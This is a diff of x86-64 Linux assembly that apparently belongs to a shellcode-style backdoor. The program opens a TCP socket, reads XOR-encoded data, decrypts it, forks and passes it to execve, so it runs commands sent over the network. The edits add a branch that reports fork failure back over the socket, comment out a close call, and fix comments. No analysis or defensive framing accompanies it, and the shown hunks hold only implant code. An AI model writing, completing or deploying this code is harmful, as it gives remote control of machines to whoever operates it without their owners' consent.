@@ -14,7 +14,6 @@ _socket:
         xor rcx,rcx
         xor rdx,rdx                     ; purge des registres
 
-
         push byte 2                     ; Family - AF_INET (2) pour IPv4
         pop rdi
         push byte 1                     ; type - SOCK_STREAM
@@ -66,7 +65,7 @@ _read:
     mov rbx, rax            ; get size of what is received
 
 	cmp rax, 0
-    jz _exit               ; loop in _read if receved is nothing
+    jz _exit               ; jump in exit if receved is nothing
 
 _decrypt_xor:              ; xor function
     ; rsi = buffer
@@ -88,7 +87,10 @@ _fork:
 	syscall
 
 	cmp rax, 0			; compare if in child process
-	jz _execve			; jmp in child process sys_read and sys_execve if in child process
+	je _execve			; jmp child process to execve
+
+    cmp rax, -1
+    je _send_error      ; si le fork fail -> goto send_error
 
 	jmp _read			; jmp in parent sys_connect if in parent process
 
@@ -137,11 +139,30 @@ _execve:
     syscall
 
 _exit:
-; ---- (3) sys_close (unsigned int fd) ----
-    mov al, 3
-    mov rdi, r15
-    syscall
+; ---- (3) sys_close (unsigned int fd) ---- close the pipe
+    ;mov al, 3
+    ;mov rdi, r15
+    ;syscall
 ; ---- (60) sys_exit (int error_code) ----
     mov       al, 60         ; system call for exit
     xor       rdi, rdi                ; exit code 0
     syscall                           ; invoke operating system to exit
+
+_send_error:
+; ---- (2) sys_write (unsigned int fd, const char *buf, size_t count) ----
+    xor rcx, rcx
+
+    mov rcx, 0x726f727265       ; "error"
+    push rcx
+    mov rsi, rsp                ; rsi = const char *buf
+
+    push 5
+    pop rdx                 ; rdx = size_t count = msg size
+
+    mov rdi, r15
+
+    mov rax, 1
+
+    syscall
+
+    jmp _exit
